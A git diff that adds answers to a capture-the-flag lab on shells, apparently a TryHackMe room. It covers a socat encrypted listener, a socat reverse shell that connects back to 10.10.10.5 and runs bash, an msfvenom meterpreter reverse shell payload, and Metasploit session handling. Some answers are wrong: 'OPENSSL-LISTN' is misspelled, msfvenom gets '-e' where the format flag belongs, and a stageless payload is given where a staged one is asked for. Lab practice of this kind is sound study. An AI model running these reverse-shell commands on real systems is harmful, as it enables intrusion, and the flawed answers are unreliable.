@@ -53,38 +53,38 @@ tcp-l:8080
 
 1. What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"
 ```
-
+socat OPENSSL-LISTN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
 ```
 2. If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?
 ```
-
+socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 ```
 
 ## Task 8
 
 1. What command can be used to create a named pipe in Linux?
 ```
-
+mkfifo
 ```
 
 ## Task 9
 
 1. Which symbol is used to show that a shell is stageless?
 ```
-
+_	
 ```
 2. What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell
 ```
-
+msfvenom -p linux/x64/meterpreter_reverse_tcp -e elf -o shell lhost=10.10.10.5 lport=443
 ```
 
 ## Task 10
 
 1. What command can be used to start a listener in the background?
 ```
-
+exploit -j
 ```
 2. If we had just received our tenth reverse shell in the current Metasploit session, what would be the command used to foreground it?
 ```
-
+sessions 10
 ```
